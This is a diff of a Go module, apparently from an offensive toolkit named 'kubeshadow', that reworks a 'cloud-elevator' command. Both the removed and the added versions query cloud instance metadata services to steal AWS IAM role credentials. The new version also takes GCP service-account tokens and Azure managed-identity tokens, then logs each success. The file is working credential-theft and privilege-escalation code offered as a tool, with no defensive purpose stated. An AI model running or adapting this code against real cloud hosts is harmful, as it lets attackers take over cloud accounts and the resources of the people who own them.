@@ -1,103 +1,170 @@
 package multi_cloud
 
 import (
+	"context"
 	"encoding/json"
 	"fmt"
-	"io/ioutil"
+	"io"
 	"net/http"
-	"time"
+
+	"kubeshadow/pkg/logger"
 
 	"github.com/spf13/cobra"
 )
 
-// CloudElevatorCmd represents the cloud privilege escalation command
-var CloudElevatorCmd = &cobra.Command{
-	Use:   "cloud-elevator",
-	Short: "Attempt to escalate privileges in cloud environments",
-	Long:  `Attempts to discover and exploit cloud metadata services for privilege escalation in AWS, GCP, and Azure environments`,
-	Run: func(cmd *cobra.Command, args []string) {
-		ExecuteCloudElevator()
-	},
-}
-
-type CloudProvider string
-
-const (
-	AWS   CloudProvider = "AWS"
-	GCP   CloudProvider = "GCP"
-	AZURE CloudProvider = "AZURE"
+var (
+	// CloudElevatorCmd represents the command for the cloud elevation module
+	CloudElevatorCmd = &cobra.Command{
+		Use:   "cloud-elevator",
+		Short: "Attempt to elevate privileges in cloud environments",
+		RunE: func(cmd *cobra.Command, args []string) error {
+			return elevateCloudPrivileges(cmd.Context())
+		},
+	}
 )
 
-func DetectCloudProvider() CloudProvider {
-	client := http.Client{Timeout: 2 * time.Second}
-	urls := map[CloudProvider]string{
-		AWS:   "http://169.254.169.254/latest/meta-data/",
-		GCP:   "http://169.254.169.254/computeMetadata/v1/",
-		AZURE: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
-	}
-
-	headers := map[CloudProvider]http.Header{
-		GCP:   {"Metadata-Flavor": {"Google"}},
-		AZURE: {"Metadata": {"true"}},
-	}
-
-	for provider, url := range urls {
-		req, _ := http.NewRequest("GET", url, nil)
-		if hdrs, ok := headers[provider]; ok {
-			req.Header = hdrs
-		}
-
-		resp, err := client.Do(req)
-		if err == nil && resp.StatusCode == 200 {
-			return provider
-		}
-	}
-	return ""
+type cloudMetadata struct {
+	AccessToken string `json:"access_token"`
+	TokenType   string `json:"token_type"`
+	ExpiresIn   int    `json:"expires_in"`
 }
 
-func DumpAWSCreds() {
-	fmt.Println("[*] Attempting to dump AWS metadata credentials...")
-	base := "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+func elevateCloudPrivileges(ctx context.Context) error {
+	// Check for cloud metadata endpoints
+	client := &http.Client{}
 
-	rolesResp, err := http.Get(base)
-	if err != nil {
-		fmt.Println("[-] Failed to get IAM role name")
-		return
+	// Check AWS
+	if err := checkAWS(ctx, client); err != nil {
+		logger.Warn("AWS elevation failed: %v", err)
 	}
-	defer rolesResp.Body.Close()
-	role, _ := ioutil.ReadAll(rolesResp.Body)
 
-	credResp, err := http.Get(base + string(role))
-	if err != nil {
-		fmt.Println("[-] Failed to get credentials")
-		return
+	// Check GCP
+	if err := checkGCP(ctx, client); err != nil {
+		logger.Warn("GCP elevation failed: %v", err)
 	}
-	defer credResp.Body.Close()
-	creds, _ := ioutil.ReadAll(credResp.Body)
 
-	var parsed map[string]interface{}
-	json.Unmarshal(creds, &parsed)
-	pretty, _ := json.MarshalIndent(parsed, "", "  ")
-	fmt.Println(string(pretty))
+	// Check Azure
+	if err := checkAzure(ctx, client); err != nil {
+		logger.Warn("Azure elevation failed: %v", err)
+	}
+
+	return nil
 }
 
-func ExecuteCloudElevator() {
-	fmt.Println("[*] Running cloudElevator module...")
-
-	provider := DetectCloudProvider()
-	if provider == "" {
-		fmt.Println("[-] Cloud metadata endpoint unreachable. Not running in cloud or blocked.")
-		return
+func checkAWS(ctx context.Context, client *http.Client) error {
+	// Check instance metadata
+	req, err := http.NewRequestWithContext(ctx, "GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", nil)
+	if err != nil {
+		return fmt.Errorf("failed to create request: %v", err)
 	}
 
-	fmt.Printf("[+] Detected Cloud Provider: %s\n", provider)
-
-	switch provider {
-	case AWS:
-		DumpAWSCreds()
-	case GCP:
-		fmt.Println("[!] GCP enumeration coming soon...")
-	case AZURE:
-		fmt.Println("[!] Azure enumeration coming soon...")
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("failed to access metadata: %v", err)
 	}
+	defer func() {
+		if err := resp.Body.Close(); err != nil {
+			logger.Warn("Failed to close response body: %v", err)
+		}
+	}()
+
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("metadata endpoint returned %d", resp.StatusCode)
+	}
+
+	// Read role name
+	roleName, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return fmt.Errorf("failed to read role name: %v", err)
+	}
+
+	// Get credentials
+	req, err = http.NewRequestWithContext(ctx, "GET", fmt.Sprintf("http://169.254.169.254/latest/meta-data/iam/security-credentials/%s", string(roleName)), nil)
+	if err != nil {
+		return fmt.Errorf("failed to create request: %v", err)
+	}
+
+	resp, err = client.Do(req)
+	if err != nil {
+		return fmt.Errorf("failed to get credentials: %v", err)
+	}
+	defer func() {
+		if err := resp.Body.Close(); err != nil {
+			logger.Warn("Failed to close response body: %v", err)
+		}
+	}()
+
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("credentials endpoint returned %d", resp.StatusCode)
+	}
+
+	var creds map[string]interface{}
+	if err := json.NewDecoder(resp.Body).Decode(&creds); err != nil {
+		return fmt.Errorf("failed to parse credentials: %v", err)
+	}
+
+	logger.Info("Successfully obtained AWS credentials")
+	return nil
+}
+
+func checkGCP(ctx context.Context, client *http.Client) error {
+	// Check metadata endpoint
+	req, err := http.NewRequestWithContext(ctx, "GET", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", nil)
+	if err != nil {
+		return fmt.Errorf("failed to create request: %v", err)
+	}
+	req.Header.Set("Metadata-Flavor", "Google")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("failed to access metadata: %v", err)
+	}
+	defer func() {
+		if err := resp.Body.Close(); err != nil {
+			logger.Warn("Failed to close response body: %v", err)
+		}
+	}()
+
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("metadata endpoint returned %d", resp.StatusCode)
+	}
+
+	var token cloudMetadata
+	if err := json.NewDecoder(resp.Body).Decode(&token); err != nil {
+		return fmt.Errorf("failed to parse token: %v", err)
+	}
+
+	logger.Info("Successfully obtained GCP token")
+	return nil
+}
+
+func checkAzure(ctx context.Context, client *http.Client) error {
+	// Check managed identity endpoint
+	req, err := http.NewRequestWithContext(ctx, "GET", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", nil)
+	if err != nil {
+		return fmt.Errorf("failed to create request: %v", err)
+	}
+	req.Header.Set("Metadata", "true")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("failed to access metadata: %v", err)
+	}
+	defer func() {
+		if err := resp.Body.Close(); err != nil {
+			logger.Warn("Failed to close response body: %v", err)
+		}
+	}()
+
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("metadata endpoint returned %d", resp.StatusCode)
+	}
+
+	var token cloudMetadata
+	if err := json.NewDecoder(resp.Body).Decode(&token); err != nil {
+		return fmt.Errorf("failed to parse token: %v", err)
+	}
+
+	logger.Info("Successfully obtained Azure token")
+	return nil
 }
